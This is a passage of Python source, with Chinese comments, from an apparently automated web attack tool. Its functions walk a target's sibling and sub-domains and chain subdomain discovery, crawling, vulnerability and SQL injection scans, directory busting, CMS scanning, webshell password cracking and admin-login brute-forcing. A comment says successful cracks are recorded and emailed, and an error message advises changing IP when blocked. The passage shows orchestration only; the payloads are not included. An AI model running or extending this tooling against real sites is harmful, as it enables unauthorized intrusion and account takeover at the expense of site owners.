                        crack_webshell_scaned = get_scan_finished("crack_webshell_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                            "/")[-1].replace(".", "_") + "_sub", each[0])
                        if crack_webshell_scaned == 0:
                            single_crack_webshell_scan(each[0])
                            set_scan_finished("crack_webshell_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                                "/")[-1].replace(".", "_") + "_sub", each[0])
                    else:
                        print(
                            "crack_webshell_scan func's each[0] error in scan_way 2")
                set_scan_finished(
                    "sub_domains_crack_webshell_scaned",
                    eval(get_key_value_from_config_file('config.ini','default','db_name')),
                    main_target_table_name,
                    target)
            else:
                print("crack_webshell_scan func's %s error" % sql)
        elif eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 3:
            # 从数据库中获取target的旁站和子站列表,如果旁站中和子站中有相同的http_domain值
            # 也即有某个如wit.freebuf.com的url即是www.freebuf.com的旁站又是它的子站,则只在旁站中爬虫一次相同的
            # domain(wit.freebuf.com),子站中不再重复爬虫同一个domain(wit.freebuf.com)

            # 从数据库中获取target的旁站列表
            if pang_domains_crack_webshell_scaned == 1 and sub_domains_crack_webshell_scaned == 1:
                return
            pang_list = []
            sql = "select http_domain from %s" % target.split(
                "/")[-1].replace(".", "_") + "_pang"
            result = execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))
            if len(result) > 0:
                for each in result:
                    if each[0] != "":
                        pang_list.append(each[0])
                        crack_webshell_scaned = get_scan_finished("crack_webshell_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                            "/")[-1].replace(".", "_") + "_pang", each[0])
                        if crack_webshell_scaned == 0:
                            single_crack_webshell_scan(each[0])
                            set_scan_finished("crack_webshell_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                                "/")[-1].replace(".", "_") + "_pang", each[0])
                    else:
                        print(
                            "crack_webshell_scan func's each[0] error in scan_way 3")
                set_scan_finished(
                    "pang_domains_crack_webshell_scaned",
                    eval(get_key_value_from_config_file('config.ini','default','db_name')),
                    main_target_table_name,
                    target)
            else:
                print("crack_webshell_scan func's %s error" % sql)

            # 从数据库中获取target的子站列表并对没有在旁站中出现的http domain爬虫
            sql = "select http_domain from %s" % target.split(
                "/")[-1].replace(".", "_") + "_sub"
            result = execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))
            if len(result) > 0:
                for each in result:
                    if each[0] != "" and each[0] not in pang_list:
                        crack_webshell_scaned = get_scan_finished("crack_webshell_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                            "/")[-1].replace(".", "_") + "_sub", each[0])
                        if crack_webshell_scaned == 0:
                            single_crack_webshell_scan(each[0])
                            set_scan_finished("crack_webshell_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                                "/")[-1].replace(".", "_") + "_sub", each[0])
                    elif each[0] in pang_list:
                        print(
                            "%s is pang domain and sub domain and will not crack webshell scan in sub domain table since \
it has crack webshell scanned in pang domain table" %
                            each[0])
                    else:
                        print(
                            "crack_webshell_scan func's each[0] error in scan_way 3")
                set_scan_finished(
                    "sub_domains_crack_webshell_scaned",
                    eval(get_key_value_from_config_file('config.ini','default','db_name')),
                    main_target_table_name,
                    target)
            else:
                print("crack_webshell_scan func's %s error" % sql)

        elif eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 4:
            pass
        else:
            print("scan_way error in crack_webshell_scan")


def single_crack_admin_page_scan(target):
    # 这里爆破所有可能是管理登录的页面,普通用户登录页面也爆破
    # target可以是主要目标或是主要目标的旁站或子站
    # dirb后缀扫描后与爬虫获得的url联合找出可疑登录页面,并进行爆破
    urls_table_name = target.split("/")[-1].replace(".", "_") + "_urls"
    result = execute_sql_in_db(
        "select url from %s where like_admin_login_url='1'" %
        (urls_table_name), eval(get_key_value_from_config_file('config.ini','default','db_name')))
    if len(result) > 0:
        for each in result:
            # crack_admin_login_url函数包括登录页面爆破,并在爆破成功后标记相应字段到数据库与发送邮件
            crack_admin_login_url(each[0])
    else:
        from colorama import init, Fore
        init(autoreset=True)
        print(
            Fore.YELLOW +
            "does't find a admin page to crack from %s" %
            target)


def crack_admin_page_scan(target):
    # 根据scan_way进行的爆破扫描

    main_target_table_name = get_main_target_table_name(target)
    http_domain_crack_admin_page_scaned = get_scan_finished(
        "crack_admin_page_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), main_target_table_name, target)
    pang_domains_crack_admin_page_scaned = get_scan_finished(
        "pang_domains_crack_admin_page_scaned",
        eval(get_key_value_from_config_file('config.ini','default','db_name')),
        main_target_table_name,
        target)
    sub_domains_crack_admin_page_scaned = get_scan_finished(
        "sub_domains_crack_admin_page_scaned",
        eval(get_key_value_from_config_file('config.ini','default','db_name')),
        main_target_table_name,
        target)
    if http_domain_crack_admin_page_scaned == 1 and pang_domains_crack_admin_page_scaned == 1 and sub_domains_crack_admin_page_scaned == 1:
        return
    else:
        if http_domain_crack_admin_page_scaned == 0:
            single_crack_admin_page_scan(target)
            set_scan_finished(
                "crack_admin_page_scaned",
                eval(get_key_value_from_config_file('config.ini','default','db_name')),
                main_target_table_name,
                target)
        elif http_domain_crack_admin_page_scaned == 1:
            print("main target crack admin page scaned")
            pass
        else:
            print("get_scan_finished error in crack_admin_page_scan func")
        if eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 1:
            if pang_domains_crack_admin_page_scaned == 1:
                return
            # 从数据库中获取target的旁站列表
            sql = "select http_domain from %s" % target.split(
                "/")[-1].replace(".", "_") + "_pang"
            result = execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))
            if len(result) > 0:
                for each in result:
                    if each[0] != "":
                        crack_admin_page_scaned = get_scan_finished("crack_admin_page_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                            "/")[-1].replace(".", "_") + "_pang", each[0])
                        if crack_admin_page_scaned == 0:
                            single_crack_admin_page_scan(each[0])
                            set_scan_finished("crack_admin_page_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                                "/")[-1].replace(".", "_") + "_pang", each[0])
                    else:
                        print(
                            "crack_admin_page_scan func's each[0] error in scan_way 1")
                set_scan_finished(
                    "pang_domains_crack_admin_page_scaned",
                    eval(get_key_value_from_config_file('config.ini','default','db_name')),
                    main_target_table_name,
                    target)
            else:
                print("crack_admin_page_scan func's %s error" % sql)
        elif eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 2:
            if sub_domains_crack_admin_page_scaned == 1:
                return
            # 从数据库中获取target的子站列表
            sql = "select http_domain from %s" % target.split(
                "/")[-1].replace(".", "_") + "_sub"
            result = execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))
            if len(result) > 0:
                for each in result:
                    if each[0] != "":
                        crack_admin_page_scaned = get_scan_finished("crack_admin_page_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                            "/")[-1].replace(".", "_") + "_sub", each[0])
                        if crack_admin_page_scaned == 0:
                            single_crack_admin_page_scan(each[0])
                            set_scan_finished("crack_admin_page_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                                "/")[-1].replace(".", "_") + "_sub", each[0])
                    else:
                        print(
                            "crack_admin_page_scan func's each[0] error in scan_way 2")
                set_scan_finished(
                    "sub_domains_crack_admin_page_scaned",
                    eval(get_key_value_from_config_file('config.ini','default','db_name')),
                    main_target_table_name,
                    target)
            else:
                print("crack_admin_page_scan func's %s error" % sql)
        elif eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 3:
            # 从数据库中获取target的旁站和子站列表,如果旁站中和子站中有相同的http_domain值
            # 也即有某个如wit.freebuf.com的url即是www.freebuf.com的旁站又是它的子站,则只在旁站中爬虫一次相同的
            # domain(wit.freebuf.com),子站中不再重复爬虫同一个domain(wit.freebuf.com)

            # 从数据库中获取target的旁站列表
            if pang_domains_crack_admin_page_scaned == 1 and sub_domains_crack_admin_page_scaned == 1:
                return
            pang_list = []
            sql = "select http_domain from %s" % target.split(
                "/")[-1].replace(".", "_") + "_pang"
            result = execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))
            if len(result) > 0:
                for each in result:
                    if each[0] != "":
                        pang_list.append(each[0])
                        crack_admin_page_scaned = get_scan_finished("crack_admin_page_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                            "/")[-1].replace(".", "_") + "_pang", each[0])
                        if crack_admin_page_scaned == 0:
                            single_crack_admin_page_scan(each[0])
                            set_scan_finished("crack_admin_page_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                                "/")[-1].replace(".", "_") + "_pang", each[0])
                    else:
                        print(
                            "crack_admin_page_scan func's each[0] error in scan_way 3")
                set_scan_finished(
                    "pang_domains_crack_admin_page_scaned",
                    eval(get_key_value_from_config_file('config.ini','default','db_name')),
                    main_target_table_name,
                    target)
            else:
                print("crack_admin_page_scan func's %s error" % sql)

            # 从数据库中获取target的子站列表并对没有在旁站中出现的http domain爬虫
            sql = "select http_domain from %s" % target.split(
                "/")[-1].replace(".", "_") + "_sub"
            result = execute_sql_in_db(sql, eval(get_key_value_from_config_file('config.ini','default','db_name')))
            if len(result) > 0:
                for each in result:
                    if each[0] != "" and each[0] not in pang_list:
                        crack_admin_page_scaned = get_scan_finished("crack_admin_page_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                            "/")[-1].replace(".", "_") + "_sub", each[0])
                        if crack_admin_page_scaned == 0:
                            single_crack_admin_page_scan(each[0])
                            set_scan_finished("crack_admin_page_scaned", eval(get_key_value_from_config_file('config.ini','default','db_name')), target.split(
                                "/")[-1].replace(".", "_") + "_sub", each[0])
                    elif each[0] in pang_list:
                        print(
                            "%s is pang domain and sub domain and will not crack admin page scan in sub domain table since \
it has crack admin page scanned in pang domain table" %
                            each[0])
                    else:
                        print(
                            "crack_admin_page_scan func's each[0] error in scan_way 3")
                set_scan_finished(
                    "sub_domains_crack_admin_page_scaned",
                    eval(get_key_value_from_config_file('config.ini','default','db_name')),
                    main_target_table_name,
                    target)
            else:
                print("crack_admin_page_scan func's %s error" % sql)

        elif eval(get_key_value_from_config_file('config.ini','default','scan_way')) == 4:
            pass
        else:
            print("scan_way error in crack_admin_page_scan")


def scan_way_init():
    print("1>scan targets and targets' pang domains\n\
2>scan targets and targets' sub domains\n\
3>scan targets and targets' pang domains and sub domains\n\
4>scan targets without pang and without sub domains\n\
please input your chioce,default [1]:>", end='')
    choose = get_input_intime('1')
    if choose == '2':
        update_config_file_key_value('config.ini','default','scan_way',2)
    elif choose == '3':
        update_config_file_key_value('config.ini','default','scan_way',3)
    elif choose == '4':
        update_config_file_key_value('config.ini','default','scan_way',4)
    else:
        update_config_file_key_value('config.ini','default','scan_way',1)


def get_http_pang_domains_list_from_db(target, db):
    # 从数据库中获取主要目标的旁站列表
    # target要是主要目标
    return_value = []
    pang_table_name = target.split("/")[-1].replace(".", "_") + "_pang"
    result = execute_sql_in_db(
        "select http_domain from %s" %
        pang_table_name, db)
    if len(result) > 0:
        for each in result:
            if len(each) > 0:
                return_value.append(each[0])


def get_http_sub_domains_list_from_db(target, db):
    # 从数据库中获取主要目标的子站列表
    # target要是主要目标
    return_value = []
    sub_table_name = target.split("/")[-1].replace(".", "_") + "_sub"
    result = execute_sql_in_db(
        "select http_domain from %s" %
        sub_table_name, db)
    if len(result) > 0:
        for each in result:
            if len(each) > 0:
                return_value.append(each[0])


def set_target_scan_finished(target):
    # 根据扫描模式设置扫描完成
    main_target_table_name = get_main_target_table_name(target)
    pang_table_name = target.split("/")[-1].replace(".", "_") + "_pang"
    sub_table_name = pang_table_name[:-5] + "_sub"
    http_pang_domains_list = get_http_pang_domains_list_from_db(
        target, eval(get_key_value_from_config_file('config.ini','default','db_name')))
    http_sub_domains_list = get_http_sub_domains_list_from_db(
        target, eval(get_key_value_from_config_file('config.ini','default','db_name')))

    # 上面将pang和sub表中的相关scaned字段设置为1
    # 下面将targets|first_targets表中相关scaned字段设置为1

    # 将targets|first_targets表中的scan_finished字段在targets|first_targets表中与主要目标相关的scaned字段为1时设
    # 置为1,表示与主要目标相关的扫描全部完成,但不考虑旁站或子站的扫描情况
    columns_result = execute_sql_in_db(
        "select column_name from information_schema.columns where table_name='%s' and column_name regexp '.*scaned' and column_name not regexp '(pang)|(sub).*' order by table_name" %
        main_target_table_name, eval(get_key_value_from_config_file('config.ini','default','db_name')))
    if len(columns_result) > 0:
        for each in columns_result:
            column_name = each[0]

            column_scaned = get_scan_finished(
                column_name, eval(get_key_value_from_config_file('config.ini','default','db_name')), main_target_table_name, target)
            if column_scaned == 0:
                return
        set_scan_finished(
            "scan_finished",
            eval(get_key_value_from_config_file('config.ini','default','db_name')),
            main_target_table_name,
            target)

    # 将xxx_xxx_xxx_pang表中的scan_finished设置为1
    # 并将target|first_targets表中的pang_domains_scan_finished字段设置为1
    if scan_way == 1:
        # 将xxx_xxx_xxx_pang表中的scan_finished设置为1
        columns_result = execute_sql_in_db("select column_name from information_schema.columns where \
table_name='%s' and column_name regexp '.*scaned' order by table_name" % pang_table_name, eval(get_key_value_from_config_file('config.ini','default','db_name')))
        if len(columns_result) > 0:
            for each_http_pang_domain in http_pang_domains_list:
                scan_not_finished = 0
                for each in columns_result:
                    column_name = each[0]
                    column_scaned = get_scan_finished(
                        column_name, eval(get_key_value_from_config_file('config.ini','default','db_name')), pang_table_name, target)
                    if column_scaned == 0:
                        scan_not_finished = 1
                if scan_not_finished == 0:
                    set_scan_finished(
                        "scan_finished",
                        eval(get_key_value_from_config_file('config.ini','default','db_name')),
                        pang_table_name,
                        each_http_pang_domain)

        # 并将target|first_targets表中的pang_domains_scan_finished字段设置为1
        columns_result = execute_sql_in_db("select column_name from information_schema.columns where \
table_name='%s' and column_name regexp 'pang.*scaned' order by table_name" % main_target_table_name, eval(get_key_value_from_config_file('config.ini','default','db_name')))
        if len(columns_result) > 0:
            for each in columns_result:
                column_name = each[0]
                column_scaned = get_scan_finished(
                    column_name, eval(get_key_value_from_config_file('config.ini','default','db_name')), main_target_table_name, target)
                if column_scaned == 0:
                    return
            set_scan_finished(
                "pang_domains_scan_finished",
                eval(get_key_value_from_config_file('config.ini','default','db_name')),
                main_target_table_name,
                target)

    # 将xxx_xxx_xxx_sub表中的scan_finished设置为1
    # 并将target|first_targets表中的sub_domains_scan_finished字段设置为1
    elif scan_way == 2:
        # 将xxx_xxx_xxx_sub表中的scan_finished设置为1
        columns_result = execute_sql_in_db("select column_name from information_schema.columns where \
table_name='%s' and column_name regexp '.*scaned' order by table_name" % sub_table_name, eval(get_key_value_from_config_file('config.ini','default','db_name')))
        if len(columns_result) > 0:
            for each_http_sub_domain in http_sub_domains_list:
                scan_not_finished = 0
                for each in columns_result:
                    column_name = each[0]
                    column_scaned = get_scan_finished(
                        column_name, eval(get_key_value_from_config_file('config.ini','default','db_name')), sub_table_name, target)
                    if column_scaned == 0:
                        scan_not_finished = 1
                if scan_not_finished == 0:
                    set_scan_finished(
                        "scan_finished",
                        eval(get_key_value_from_config_file('config.ini','default','db_name')),
                        sub_table_name,
                        each_http_sub_domain)

        # 并将target|first_targets表中的sub_domains_scan_finished字段设置为1
        columns_result = execute_sql_in_db("select column_name from information_schema.columns where \
table_name='%s' and column_name regexp 'sub.*scaned' order by table_name" % main_target_table_name, eval(get_key_value_from_config_file('config.ini','default','db_name')))
        if len(columns_result) > 0:
            for each in columns_result:
                column_name = each[0]
                column_scaned = get_scan_finished(
                    column_name, eval(get_key_value_from_config_file('config.ini','default','db_name')), main_target_table_name, target)
                if column_scaned == 0:
                    return
            set_scan_finished(
                "sub_domains_scan_finished",
                eval(get_key_value_from_config_file('config.ini','default','db_name')),
                main_target_table_name,
                target)

    # 将xxx_xxx_xxx_pang表中的scan_finished设置为1
    # 将xxx_xxx_xxx_sub表中的scan_finished设置为1
    # 并将targets|first_targets表中的pang_domains_scan_finished和sub_domains_scan_finished都设置为1
    elif scan_way == 3:
        # 将xxx_xxx_xxx_pang表中的scan_finished设置为1
        columns_result = execute_sql_in_db("select column_name from information_schema.columns where \
table_name='%s' and column_name regexp '.*scaned' order by table_name" % pang_table_name, eval(get_key_value_from_config_file('config.ini','default','db_name')))
        if len(columns_result) > 0:
            for each_http_pang_domain in http_pang_domains_list:
                scan_not_finished = 0
                for each in columns_result:
                    column_name = each[0]
                    column_scaned = get_scan_finished(
                        column_name, eval(get_key_value_from_config_file('config.ini','default','db_name')), pang_table_name, target)
                    if column_scaned == 0:
                        scan_not_finished = 1
                if scan_not_finished == 0:
                    set_scan_finished(
                        "scan_finished",
                        eval(get_key_value_from_config_file('config.ini','default','db_name')),
                        pang_table_name,
                        each_http_pang_domain)

        # 将xxx_xxx_xxx_sub表中的scan_finished设置为1
        columns_result = execute_sql_in_db("select column_name from information_schema.columns where \
table_name='%s' and column_name regexp '.*scaned' order by table_name" % sub_table_name, eval(get_key_value_from_config_file('config.ini','default','db_name')))
        if len(columns_result) > 0:
            for each_http_sub_domain in http_sub_domains_list:
                scan_not_finished = 0
                for each in columns_result:
                    column_name = each[0]
                    column_scaned = get_scan_finished(
                        column_name, eval(get_key_value_from_config_file('config.ini','default','db_name')), sub_table_name, target)
                    if column_scaned == 0:
                        scan_not_finished = 1
                if scan_not_finished == 0:
                    set_scan_finished(
                        "scan_finished",
                        eval(get_key_value_from_config_file('config.ini','default','db_name')),
                        sub_table_name,
                        each_http_sub_domain)

        # 并将targets|first_targets表中的pang_domains_scan_finished和sub_domains_scan_finished都设置为1
        columns_result = execute_sql_in_db("select column_name from information_schema.columns where \
table_name='%s' and column_name regexp '(pang)|(sub).*scaned' order by table_name" % main_target_table_name, eval(get_key_value_from_config_file('config.ini','default','db_name')))
        if len(columns_result) > 0:
            for each in columns_result:
                column_name = each[0]
                column_scaned = get_scan_finished(
                    column_name, eval(get_key_value_from_config_file('config.ini','default','db_name')), main_target_table_name, target)
                if column_scaned == 0:
                    return
            set_scan_finished(
                "pang_domains_scan_finished",
                eval(get_key_value_from_config_file('config.ini','default','db_name')),
                main_target_table_name,
                target)
            set_scan_finished(
                "sub_domains_scan_finished",
                eval(get_key_value_from_config_file('config.ini','default','db_name')),
                main_target_table_name,
                target)

    elif scan_way == 4:
        pass
    else:
        print("scan_way error,check it")


def auto_attack(target):
    # 自动化检测target流程
    # 根据扫描模式进行旁站获取
    get_pang_domains(target)
    # 根据扫描模式进行子站获取
    get_sub_domains(target)
    # crawl_scan是对target相关的目标(pang domains或sub domains)全部执行crawl_url爬虫的函数
    try:
        crawl_scan(target)
    except:
        from colorama import init, Fore
        init(autoreset=True)
        print(
            Fore.YELLOW +
            "you may be banned to crawl this target,change ip or wait for some time before crawl it again")
    # 根据扫描模式进行高危漏洞扫描
    risk_scan(target)
    # 根据扫描模式进行sqli漏洞扫描
    sqli_scan(target)
    # 根据扫描模式进行目录扫描
    script_type_scan(target)
    # 根据扫描模式进行目标脚本类型获取
    dirb_scan(target)
    # 根据扫描模式进行cms扫描
    cms_scan(target)
    # 根据扫描模式进行webshell爆破扫描
    crack_webshell_scan(target)
    # 根据扫描模式进行登录页面扫描
    crack_admin_page_scan(target)
    # 根据扫描模式设置扫描完成
    set_target_scan_finished(target)

    pass
